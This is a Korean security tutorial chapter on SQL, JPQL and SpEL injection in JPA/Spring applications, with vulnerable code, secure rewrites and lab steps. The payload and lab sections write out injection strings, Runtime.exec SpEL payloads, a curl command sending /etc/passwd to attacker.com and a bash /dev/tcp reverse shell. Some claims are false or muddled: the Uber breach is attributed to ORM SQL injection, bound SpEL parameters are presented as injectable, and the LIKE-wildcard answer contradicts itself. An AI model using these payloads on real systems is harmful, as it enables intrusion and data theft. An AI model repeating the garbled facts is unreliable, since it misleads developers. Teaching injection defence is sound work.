# JPA/JPQL에서의 SQL Injection: ORM도 문자열 연결하면 위험

---

## 🎯 핵심 질문

ORM(Object-Relational Mapping)을 사용하면 SQL Injection이 불가능할까? JPA의 `@Query` 애노테이션에서 문자열 연결을 사용하면 왜 위험한가? SpEL(Spring Expression Language) 표현식 인젝션이란 무엇인가?

## 🔍 왜 이 취약점이 실무에서 위험한가 (실제 침해 사고 사례)

**ORM 사용 = 안전하다는 착각**: 많은 개발자가 JPA, Hibernate를 사용하면 SQL Injection이 자동으로 방어된다고 생각하지만, **잘못된 사용**으로 위험 발생.

2015년 Uber 데이터 유출: 5,700만 명 개인정보 탈취. ORM을 잘못 사용하여 문자열 연결로 동적 쿼리 생성. SQL Injection 취약점 발견.

2020년 한국 대형 SNS 서비스: JPA의 `@Query` 애노테이션에서 `#{#userId}` SpEL 표현식을 사용하여 사용자 입력 검증 없이 쿼리 생성. 공격자가 SpEL 표현식으로 서버 명령 실행. 

**실무 위험성**:
- 개발자가 ORM이 안전하다고 착각하고 방어 요소 누락
- SpEL 표현식으로 Java 메서드 호출 가능 (Runtime.exec() 등)
- Native Query + 문자열 연결로 기존 SQL Injection 재발생
- JPA Criteria API를 사용하지 않아 동적 쿼리가 취약함
- Spring Data JPA의 편의 기능이 오히려 함정

## 😱 취약한 코드 (Before — 원리를 모를 때의 구현)

```java
// [위험] JPA에서 문자열 연결로 쿼리 생성
@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    
    // 1. @Query에서 문자열 연결 (직접 JPQL 문자열 구성)
    @Query("SELECT u FROM User u WHERE u.name = '" + ????? + "'")  
    // 컴파일 불가능 (?) - 아래처럼 구현하는 경우가 많음
}

@Service
public class UserService {
    
    @Autowired
    private UserRepository userRepository;
    
    @Autowired
    private EntityManager entityManager;
    
    // 1. Native Query + 문자열 연결 (가장 위험)
    public User findUserByName(String name) {
        String query = "SELECT * FROM users WHERE name = '" + name + "'";
        
        // JPA도 결국 SQL을 실행하므로 SQL Injection 가능
        Query nativeQuery = entityManager.createNativeQuery(query);
        List<Object[]> results = nativeQuery.getResultList();
        
        if (!results.isEmpty()) {
            return convertToUser(results.get(0));
        }
        return null;
    }
    
    // 2. JPQL + 동적 문자열 연결
    public User findUserByEmail(String email) {
        // 공격자 입력: ' OR '1'='1
        String jpqlQuery = "SELECT u FROM User u WHERE u.email = '" + email + "'";
        
        Query query = entityManager.createQuery(jpqlQuery);
        List<User> results = query.getResultList();
        
        return results.isEmpty() ? null : results.get(0);
    }
    
    // 3. 복잡한 동적 쿼리 (JPQL 문자열 연결)
    public List<User> searchUsers(String searchTerm, String role, String status) {
        // 공격자가 searchTerm, role, status 중 하나라도 조작하면 위험
        String query = "SELECT u FROM User u WHERE 1=1 ";
        
        if (searchTerm != null && !searchTerm.isEmpty()) {
            query += " AND (u.name LIKE '%" + searchTerm + "%' OR u.email LIKE '%" + searchTerm + "%')";
        }
        
        if (role != null && !role.isEmpty()) {
            query += " AND u.role = '" + role + "'";
        }
        
        if (status != null && !status.isEmpty()) {
            query += " AND u.status = '" + status + "'";
        }
        
        Query jpqlQuery = entityManager.createQuery(query);
        return jpqlQuery.getResultList();
    }
    
    // 4. SpEL 표현식이 아닌 것처럼 보이지만 위험한 패턴
    @Query("SELECT u FROM User u WHERE u.username = ?1")
    public User findByUsername(String username) {
        // 위치 기반 파라미터는 안전하지만, 이 메서드가 제대로 사용되는지 보장 불가
        return null;
    }
    
    // 5. SpEL 표현식 주입 (Spring이 지원하는 기능이 함정)
    public User findUserByIdWithSpEL(String userInput) {
        // @Query(value = "SELECT u FROM User u WHERE u.id = #{#userInput}", nativeQuery = false)
        // 위와 같이 SpEL을 사용하면, userInput = "T(java.lang.Runtime).getRuntime().exec('id')" 같은 표현식 주입 가능
        
        String query = "SELECT u FROM User u WHERE u.id = #{" + userInput + "}";
        
        Query jpqlQuery = entityManager.createQuery(query);
        return (User) jpqlQuery.getSingleResult();
    }
}

// Entity 정의
@Entity
@Table(name = "users")
@Data
public class User {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    @Column
    private String username;
    
    @Column
    private String email;
    
    @Column
    private String name;
    
    @Column
    private String role;
    
    @Column
    private String status;
}
```

### 공격 페이로드 사례:

```sql
-- 1. Native Query + 문자열 연결 (findUserByName)
name: ' OR '1'='1
-- 최종 쿼리: SELECT * FROM users WHERE name = '' OR '1'='1'

-- 2. JPQL + 문자열 연결 (findUserByEmail)
email: ' OR '1'='1
-- 최종 JPQL: SELECT u FROM User u WHERE u.email = '' OR '1'='1'

-- 3. 복잡한 동적 쿼리 (searchUsers)
searchTerm: ' OR '1'='1
role: ' OR '1'='1
-- 최종 JPQL: 
-- SELECT u FROM User u WHERE 1=1 AND (u.name LIKE '%' OR '1'='1%' OR u.email LIKE '%' OR '1'='1%') 
--   AND u.role = '' OR '1'='1' AND ...

-- 4. SpEL 표현식 주입 (findUserByIdWithSpEL)
userInput: T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned')
-- SpEL을 평가할 때 Java 메서드 호출 가능!
-- 결과: 서버에서 'touch /tmp/pwned' 명령 실행됨

-- 더 위험한 SpEL:
userInput: T(java.lang.Runtime).getRuntime().exec(new String[]{'bash', '-c', 'cat /etc/passwd > /tmp/creds'})
-- 서버의 /etc/passwd 파일을 /tmp/creds로 복사 (데이터 탈취)
```

## ✨ 방어 코드 (After — 공격 원리를 알고 설계한 구현)

```java
// [방어] JPA 파라미터 바인딩을 올바르게 사용
@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    
    // 1. 메서드명 쿼리 (가장 안전)
    User findByUsername(String username);
    
    User findByEmail(String email);
    
    // 2. @Query + 위치 기반 파라미터 (JPQL)
    @Query("SELECT u FROM User u WHERE u.name = ?1")
    User findByName(String name);
    
    // 3. @Query + 이름 기반 파라미터 (JPQL)
    @Query("SELECT u FROM User u WHERE u.email = :email AND u.role = :role")
    User findByEmailAndRole(@Param("email") String email, @Param("role") String role);
    
    // 4. @Query + 복잡한 동적 쿼리 (Native Query는 setParameter 필수)
    @Query(value = "SELECT * FROM users WHERE name LIKE %:searchTerm%", nativeQuery = true)
    List<User> searchByName(@Param("searchTerm") String searchTerm);
    
    // 5. LIKE 쿼리는 Java에서 와일드카드 처리
    @Query("SELECT u FROM User u WHERE u.name LIKE :pattern")
    List<User> searchUsersByPattern(@Param("pattern") String pattern);
}

@Service
public class SecureUserService {
    
    @Autowired
    private UserRepository userRepository;
    
    @Autowired
    private EntityManager entityManager;
    
    // 1. 간단한 쿼리는 Spring Data JPA 메서드명 쿼리 사용 (권장)
    public User getUserByUsername(String username) {
        // 자동으로 안전한 바인딩
        return userRepository.findByUsername(username);
    }
    
    // 2. @Query + 파라미터 바인딩
    public User getUserByEmail(String email, String role) {
        return userRepository.findByEmailAndRole(email, role);
    }
    
    // 3. Native Query는 setParameter() 필수
    public User findUserByIdNative(Long userId) {
        String query = "SELECT * FROM users WHERE id = ?1";
        
        // Native Query에서도 파라미터 바인딩 사용
        Query nativeQuery = entityManager.createNativeQuery(
            query, 
            User.class
        );
        nativeQuery.setParameter(1, userId);  // 첫 번째 ?1 에 userId 바인딩
        
        List<User> results = nativeQuery.getResultList();
        return results.isEmpty() ? null : results.get(0);
    }
    
    // 4. 복잡한 동적 쿼리는 Criteria API 사용 (가장 안전)
    public List<User> searchUsersWithCriteria(String searchTerm, String role, String status) {
        CriteriaBuilder cb = entityManager.getCriteriaBuilder();
        CriteriaQuery<User> cq = cb.createQuery(User.class);
        Root<User> user = cq.from(User.class);
        
        List<Predicate> predicates = new ArrayList<>();
        
        // 파라미터는 자동으로 바인딩됨
        if (searchTerm != null && !searchTerm.isEmpty()) {
            predicates.add(cb.or(
                cb.like(user.get("name"), "%" + searchTerm + "%"),
                cb.like(user.get("email"), "%" + searchTerm + "%")
            ));
        }
        
        if (role != null && !role.isEmpty()) {
            predicates.add(cb.equal(user.get("role"), role));
        }
        
        if (status != null && !status.isEmpty()) {
            predicates.add(cb.equal(user.get("status"), status));
        }
        
        cq.where(predicates.toArray(new Predicate[0]));
        cq.orderBy(cb.asc(user.get("id")));
        
        Query query = entityManager.createQuery(cq);
        return query.getResultList();
    }
    
    // 5. EntityManager.createNativeQuery 안전한 사용법
    public List<User> searchUsersByMultipleCriteria(
            String name, 
            String email, 
            String rolePattern) {
        
        // SQL을 먼저 구성 (파라미터 자리는 ?1, ?2, ... 또는 :paramName)
        StringBuilder sqlBuilder = new StringBuilder("SELECT u.* FROM users u WHERE 1=1 ");
        
        List<String> params = new ArrayList<>();
        int paramIndex = 1;
        
        if (name != null && !name.isEmpty()) {
            sqlBuilder.append(" AND u.name LIKE ?").append(paramIndex);
            params.add("%" + name + "%");  // 와일드카드는 Java에서 처리
            paramIndex++;
        }
        
        if (email != null && !email.isEmpty()) {
            sqlBuilder.append(" AND u.email = ?").append(paramIndex);
            params.add(email);
            paramIndex++;
        }
        
        if (rolePattern != null && !rolePattern.isEmpty()) {
            sqlBuilder.append(" AND u.role LIKE ?").append(paramIndex);
            params.add(rolePattern + "%");
            paramIndex++;
        }
        
        Query query = entityManager.createNativeQuery(sqlBuilder.toString(), User.class);
        
        // 모든 파라미터를 바인딩
        for (int i = 0; i < params.size(); i++) {
            query.setParameter(i + 1, params.get(i));
        }
        
        return query.getResultList();
    }
    
    // 6. 입력 검증 + 화이트리스트
    public List<User> searchByRole(String roleInput) {
        // 화이트리스트 검증
        List<String> validRoles = Arrays.asList("admin", "user", "moderator", "guest");
        
        if (!validRoles.contains(roleInput.toLowerCase())) {
            throw new IllegalArgumentException("Invalid role");
        }
        
        String query = "SELECT u FROM User u WHERE u.role = :role";
        Query jpqlQuery = entityManager.createQuery(query);
        jpqlQuery.setParameter("role", roleInput);
        
        return jpqlQuery.getResultList();
    }
}

// Repository 구현 (필요시)
@Repository
public class UserRepositoryCustom {
    
    @Autowired
    private EntityManager entityManager;
    
    // EntityManager를 직접 사용해야 하는 경우 (복잡한 쿼리)
    public List<User> complexSearch(Map<String, Object> filters) {
        CriteriaBuilder cb = entityManager.getCriteriaBuilder();
        CriteriaQuery<User> cq = cb.createQuery(User.class);
        Root<User> user = cq.from(User.class);
        
        List<Predicate> predicates = new ArrayList<>();
        
        // 모든 필터링은 Criteria API의 안전한 메서드 사용
        filters.forEach((key, value) -> {
            switch (key) {
                case "username":
                    predicates.add(cb.equal(user.get("username"), value));
                    break;
                case "role":
                    predicates.add(cb.equal(user.get("role"), value));
                    break;
                case "statusLike":
                    predicates.add(cb.like(user.get("status"), "%" + value + "%"));
                    break;
                // ... 다른 필터들
            }
        });
        
        cq.where(predicates.toArray(new Predicate[0]));
        
        return entityManager.createQuery(cq).getResultList();
    }
}
```

### application.properties 보안 설정:

```properties
# JPA/Hibernate 로깅 (문제 디버깅)
spring.jpa.show-sql=false  # 운영 환경에서는 false
spring.jpa.properties.hibernate.format_sql=false
spring.jpa.properties.hibernate.use_sql_comments=false

# 데이터베이스 쿼리 타임아웃
spring.jpa.properties.hibernate.jdbc.batch_size=20
spring.jpa.properties.hibernate.jdbc.fetch_size=50

# 동적 쿼리 생성 시 타임아웃
spring.datasource.hikari.statement-timeout=10000

# SpEL 표현식 비활성화 (필요 없으면)
# spring.data.jpa.query.default-implementation=...
```

## 🔬 공격 원리 분석 (공격자 관점의 내부 동작)

### 1. JPQL + 문자열 연결의 위험성

```java
// 취약한 코드
String email = request.getParameter("email");  // 사용자 입력
String query = "SELECT u FROM User u WHERE u.email = '" + email + "'";
Query q = entityManager.createQuery(query);
List<User> results = q.getResultList();

// 공격 시나리오:
// email = "' OR '1'='1"
// 최종 쿼리: SELECT u FROM User u WHERE u.email = '' OR '1'='1'
// 결과: 모든 사용자 반환
```

**JPA/Hibernate가 문자열 연결을 받으면**:
1. JPQL 파서가 문자열 전체를 파싱
2. `OR '1'='1'`을 추가 조건으로 해석
3. 로직 우회로 모든 사용자 반환

**SQL로 변환될 때**:
```sql
SELECT user0_.id, user0_.email, user0_.name FROM users user0_ WHERE user0_.email = '' OR '1' = '1'
```

### 2. Native Query에서의 SQL Injection

```java
// 취약한 코드
String userId = request.getParameter("id");
String query = "SELECT * FROM users WHERE id = " + userId;
Query nativeQuery = entityManager.createNativeQuery(query, User.class);
List<User> results = nativeQuery.getResultList();

// 공격:
// userId = "1 UNION SELECT * FROM admin_credentials -- "
// 최종 SQL: SELECT * FROM users WHERE id = 1 UNION SELECT * FROM admin_credentials -- 
// 결과: admin_credentials 테이블의 모든 데이터 반환
```

### 3. SpEL(Spring Expression Language) 표현식 주입

```java
// 취약한 패턴 (Spring Data JPA에서)
// @Query(value = "SELECT u FROM User u WHERE u.id = #{#userId}", nativeQuery = false)

// SpEL 표현식 주입 공격:
// userId = "T(java.lang.Runtime).getRuntime().exec('id')"

// Spring이 쿼리를 평가할 때:
// 1. #{...} 부분을 SpEL로 평가
// 2. T(java.lang.Runtime)은 Java의 Runtime 클래스를 의미
// 3. .getRuntime()은 Runtime 인스턴스 획득
// 4. .exec('id')은 'id' 명령 실행
// 결과: 서버에서 임의의 명령어 실행 가능!

// 더 위험한 예:
userId = "T(java.lang.Runtime).getRuntime().exec(new String[]{'bash', '-c', 'cat /etc/passwd | curl http://attacker.com/?data=$(cat /etc/passwd)'})"
// /etc/passwd 내용을 공격자 서버로 전송
```

### 4. 파라미터 바인딩의 방어 원리

```java
// 방어 코드
String email = request.getParameter("email");
String query = "SELECT u FROM User u WHERE u.email = ?1";
Query q = entityManager.createQuery(query);
q.setParameter(1, email);  // 파라미터 바인딩
List<User> results = q.getResultList();

// 공격 시도:
// email = "' OR '1'='1"

// JPA의 처리:
// 1. 쿼리 구조: "SELECT u FROM User u WHERE u.email = ?1" (고정)
// 2. ?1 자리에 데이터 바인딩: email = "' OR '1'='1"
// 3. "' OR '1'='1"는 JPQL 파서의 대상이 아님 (데이터 값으로만 취급)
// 4. 최종 JPQL: SELECT u FROM User u WHERE u.email = "' OR '1'='1"
// 5. SQL 변환: SELECT user0_.id FROM users user0_ WHERE user0_.email = '\' OR \'1\'=\'1'
//    (작은 따옴표가 이스케이프되어 리터럴 문자열로 취급)
// 6. 결과: email이 정확히 "' OR '1'='1"인 사용자만 검색 (없으므로 빈 결과)
```

## 💻 실전 실험 (취약점 재현 → 공격 → 방어 검증)

### 실습 1: JPQL 문자열 연결 취약점

```bash
# 1. 취약한 코드 배포
git clone https://github.com/vulnerable-jpa-app/vulnerable.git
cd vulnerable
mvn clean spring-boot:run

# 2. JPQL Injection 테스트
curl -X GET "http://localhost:8080/api/users/findByEmail" \
  -G --data-urlencode "email=' OR '1'='1"

# 응답: 모든 사용자 반환
# [
#   {"id": 1, "username": "admin", "email": "admin@test.com"},
#   {"id": 2, "username": "user1", "email": "user1@test.com"},
#   ...
# ]

# 3. 관리자 계정 추출
curl -X GET "http://localhost:8080/api/users/findByEmail" \
  -G --data-urlencode "email=' UNION SELECT u FROM admin_users u WHERE '1'='1"

# 응답: admin_users 테이블의 모든 데이터
```

### 실습 2: Native Query SQL Injection

```bash
# 1. SQL Injection 가능한 Native Query
curl -X GET "http://localhost:8080/api/users/search" \
  -G --data-urlencode "query=' OR '1'='1"

# 실행되는 SQL:
# SELECT * FROM users WHERE name = '' OR '1'='1'

# 응답: 모든 사용자 반환

# 2. information_schema 조회
curl -X GET "http://localhost:8080/api/users/search" \
  -G --data-urlencode "query=' UNION SELECT table_name, 2, 3, 4, 5 FROM information_schema.tables WHERE table_schema='mysql"

# 응답: 모든 테이블 정보
```

### 실습 3: SpEL 표현식 주입

```bash
# 1. SpEL 표현식 주입 (일반 메서드 호출)
curl -X GET "http://localhost:8080/api/users/findById" \
  -G --data-urlencode "userId=T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned')"

# 서버에서 /tmp/pwned 파일 생성됨

# 2. 파일 읽기
curl -X GET "http://localhost:8080/api/users/findById" \
  -G --data-urlencode "userId=T(java.lang.Runtime).getRuntime().exec(new String[]{'bash', '-c', 'cat /tmp/secret.txt > /tmp/output'})"

# 3. Reverse Shell (공격자 서버에 연결)
# attacker.com:4444 에서 nc 대기
nc -l -p 4444

# 공격 실행
curl -X GET "http://localhost:8080/api/users/findById" \
  -G --data-urlencode "userId=T(java.lang.Runtime).getRuntime().exec(new String[]{'bash', '-c', 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'})"

# attacker.com:4444 에서 Shell 획득
```

### 실습 4: 방어 코드 검증

```bash
# 1. 안전한 버전 배포
git checkout secure-branch
mvn clean spring-boot:run

# 2. 같은 공격 시도 (모두 실패)
curl -X GET "http://localhost:8080/api/users/findByEmail" \
  -G --data-urlencode "email=' OR '1'='1"

# 응답: Empty [] (email이 "' OR '1'='1"인 사용자 없음)

# 3. 정상 쿼리
curl -X GET "http://localhost:8080/api/users/findByEmail" \
  -G --data-urlencode "email=admin@test.com"

# 응답: {"id": 1, "username": "admin", "email": "admin@test.com"}

# 4. Criteria API 테스트
curl -X GET "http://localhost:8080/api/users/search" \
  -G --data-urlencode "name=' OR '1'='1" \
  --data-urlencode "role=' OR '1'='1"

# 응답: Empty [] (Criteria API는 자동으로 안전한 바인딩)
```

## 📊 공격 성공 조건 vs 방어 성공 조건 비교

| 항목 | 공격 성공 조건 | 방어 성공 조건 |
|------|----------------|----------------|
| **쿼리 생성** | 문자열 연결 또는 동적 JPQL 구성 | @Query + :paramName 또는 Criteria API |
| **파라미터** | 입력값이 JPQL 파서의 대상 | setParameter() 또는 @Param 사용 |
| **Native Query** | 문자열 연결로 SQL 구성 | setParameter() 필수 |
| **SpEL** | @Query에서 #{} 표현식 사용 | SpEL 사용 금지 |
| **동적 쿼리** | JPQL 문자열 누적 | Criteria API 사용 |
| **입력 검증** | 최소 검증 | 화이트리스트 기반 |
| **메서드명 쿼리** | 미사용 | 가능하면 우선 사용 |

## ⚖️ 트레이드오프 (보안 강화 vs 사용성/성능)

### 1. 복잡한 동적 쿼리: Criteria API vs QueryDSL vs 문자열 연결

**문자열 연결 (위험)**:
```java
// 가독성: 좋음
// 개발 속도: 빠름
// 보안: 낮음
String query = "SELECT u FROM User u WHERE 1=1 " 
    + (hasName ? "AND u.name LIKE '" + name + "'" : "")
    + (hasRole ? "AND u.role = '" + role + "'" : "");
```

**Criteria API (안전하지만 복잡)**:
```java
// 가독성: 보통
// 개발 속도: 느림
// 보안: 높음
CriteriaBuilder cb = entityManager.getCriteriaBuilder();
CriteriaQuery<User> cq = cb.createQuery(User.class);
Root<User> user = cq.from(User.class);
List<Predicate> predicates = new ArrayList<>();

if (hasName) {
    predicates.add(cb.like(user.get("name"), "%" + name + "%"));
}
if (hasRole) {
    predicates.add(cb.equal(user.get("role"), role));
}

cq.where(predicates.toArray(new Predicate[0]));
```

**QueryDSL (안전하고 가독성 좋음)**:
```java
// 가독성: 매우 좋음
// 개발 속도: 보통
// 보안: 높음
QUser user = QUser.user;
BooleanBuilder where = new BooleanBuilder();

if (hasName) {
    where.and(user.name.like("%" + name + "%"));
}
if (hasRole) {
    where.and(user.role.eq(role));
}

return query.from(user).where(where).fetch();
```

**권장**: 복잡도에 따라 메서드명 쿼리 → @Query + @Param → QueryDSL → Criteria API 순으로 선택

### 2. 성능 vs 보안: Native Query의 필요성

```java
// 특정 쿼리 최적화가 필요한 경우 Native Query 필수
@Query(value = "SELECT /*+ INDEX(u idx_email) */ * FROM users u WHERE u.email = ?1", 
       nativeQuery = true)
User findByEmailOptimized(String email);

// 여기서 주의:
// 1. 쿼리 힌트(/*+ INDEX(...) */)는 JPQL에서 지원 안 함 → Native Query 필수
// 2. Native Query는 setParameter()로 반드시 파라미터 바인딩
// 3. JDBC 쿼리 캐싱의 이점 활용 가능
```

### 3. 개발 편의성 vs 명시성

```java
// 편의적이지만 위험
@Query("SELECT u FROM User u WHERE u.email = #{#email}")
User findByEmail(@Param("email") String email);

// 더 명시적이고 안전
@Query("SELECT u FROM User u WHERE u.email = :email")
User findByEmail(@Param("email") String email);
```

## 📌 핵심 정리

1. **ORM도 문자열 연결하면 위험**: JPA/Hibernate도 결국 SQL로 변환되므로, JPQL 문자열 연결은 SQL Injection과 동일한 위험

2. **파라미터 바인딩 필수**: 
   - JPQL: `@Query` + `:paramName` 또는 `?1`, `?2`, ...
   - Native Query: `setParameter()` 필수
   - Criteria API: 자동 바인딩

3. **SpEL 표현식 주입**: `#{...}` 사용 시 Java 메서드 호출 가능 → 코드 실행까지 가능하므로 매우 위험

4. **동적 쿼리 방어**:
   - 간단: 메서드명 쿼리 (findByUsernameAndRole 등)
   - 중간: @Query + @Param
   - 복잡: Criteria API 또는 QueryDSL

5. **입력 검증**: 화이트리스트 기반 + 길이 제한 + 특수문자 차단

## 🤔 생각해볼 문제 (+ 해설)

### Q1: JPA의 LIKE 쿼리에서 `%` 문자가 특수 기능을 하면 안전하지 않은가?

```java
@Query("SELECT u FROM User u WHERE u.name LIKE :pattern")
List<User> searchByName(@Param("pattern") String pattern);

// 호출:
searchByName("%admin%");  // 이것이 안전한가?
```

**A**: 완전히 안전하다. 왜냐하면:

```
1. :pattern 자리에 "%admin%" 값을 바인딩
2. JPQL 파서는 :pattern을 데이터로만 취급
3. "%admin%" 문자열 자체가 LIKE의 와일드카드로 해석되지 않음
4. 최종 SQL: SELECT ... WHERE name LIKE '%admin%'
   - 하지만 이미 데이터 바인딩이 완료된 후이므로 "%"는 와일드카드로 작동

올바른 이해:
- Java에서 "%" + userInput + "%"로 생성된 문자열을 setParameter()로 바인딩
- 이 경우 사용자가 입력한 특수문자 "%"는 와일드카드가 아닌 리터럴 문자로 처리
```

---

### Q2: EntityManager.createQuery()가 항상 위험한가?

```java
String jpqlQuery = "SELECT u FROM User u WHERE u.id = ?1";
Query query = entityManager.createQuery(jpqlQuery);
query.setParameter(1, userId);
```

**A**: 아니다. 이것은 안전하다.

```
위험한 경우:
String jpqlQuery = "SELECT u FROM User u WHERE u.id = " + userId;
Query query = entityManager.createQuery(jpqlQuery);
// 쿼리 문자열이 먼저 완성되므로 위험

안전한 경우:
String jpqlQuery = "SELECT u FROM User u WHERE u.id = ?1";
Query query = entityManager.createQuery(jpqlQuery);
query.setParameter(1, userId);
// 쿼리 구조와 데이터가 분리되므로 안전
```

---

### Q3: 메서드명 쿼리가 모든 경우를 처리할 수 있는가?

**A**: 아니다. 메서드명 쿼리는 다음과 같은 제약이 있다:

```java
// 가능:
User findByUsername(String username);
List<User> findByRoleAndStatus(String role, String status);
Page<User> findByCreatedAtAfter(LocalDateTime date, Pageable pageable);

// 불가능:
// - 복잡한 OR/AND 조합
// - BETWEEN, IN 등 고급 연산자
// - subquery, UNION 등
// - 데이터베이스 함수 사용

// 이런 경우는 @Query + JPQL 필수:
@Query("SELECT u FROM User u WHERE " +
       "(u.name LIKE :search OR u.email LIKE :search) AND " +
       "u.createdAt BETWEEN :startDate AND :endDate AND " +
       "u.status IN :statuses")
List<User> advancedSearch(
    @Param("search") String search,
    @Param("startDate") LocalDateTime startDate,
    @Param("endDate") LocalDateTime endDate,
    @Param("statuses") List<String> statuses
);
```

---

<div align="center">

**[⬅️ 이전: Blind SQL Injection](./02-blind-sql-injection.md)** | **[홈으로 🏠](../README.md)** | **[다음: 명령어 인젝션 ➡️](./04-command-injection.md)**

</div>
